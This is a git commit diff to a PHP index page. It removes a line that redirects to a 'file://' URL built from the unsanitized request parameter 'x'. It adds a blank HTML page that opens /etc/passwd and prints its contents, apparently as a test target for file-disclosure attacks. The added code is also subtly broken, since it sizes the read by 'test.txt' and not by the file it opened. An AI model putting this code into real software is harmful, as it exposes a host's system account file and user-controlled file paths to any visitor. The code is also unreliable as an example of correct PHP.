c55296384f1cf0b3e125663136d33f19c27d5a74
yhormg <temer1815@gmail.com>
2025-06-05 02:44:03 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,13 @@
-<?php header('location:file://'.$_REQUEST['x']); ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+	<?php $fp = fopen("/etc/passwd", "r") or die("Unable to open file!"); 
+	echo fread($fp,filesize("test.txt"));
+	?>
+</body>
+</html>
